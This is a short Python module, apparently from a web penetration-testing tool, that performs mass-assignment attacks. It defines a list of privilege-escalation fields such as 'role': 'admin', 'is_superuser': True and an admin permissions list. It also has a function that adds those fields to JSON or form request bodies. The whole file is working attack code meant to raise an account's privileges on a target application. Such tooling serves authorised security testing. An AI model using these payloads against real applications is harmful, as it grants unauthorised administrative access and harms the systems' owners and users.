"""
Mass Assignment / Parameter Pollution Attacks
"""

from typing import List, Dict

class MassAssignment:
    @staticmethod
    def get_privilege_parameters() -> List[Dict[str, any]]:
        """Return common privilege escalation parameters"""
        return [
            {"role": "admin"},
            {"is_admin": True},
            {"admin": True},
            {"is_superuser": True},
            {"role": "administrator"},
            {"user_type": "admin"},
            {"account_type": "premium"},
            {"permissions": ["admin", "write", "delete"]},
            {"group": "administrators"},
            {"level": 99},
            {"is_staff": True},
            {"is_verified": True},
            {"status": "active"},
            {"approved": True}
        ]
    
    @staticmethod
    def inject_parameters(body: str, params: Dict) -> str:
        """Inject additional parameters into JSON body"""
        import json
        try:
            data = json.loads(body)
            data.update(params)
            return json.dumps(data)
        except:
            # If not JSON, try form data
            for key, value in params.items():
                body += f"&{key}={value}"
            return body
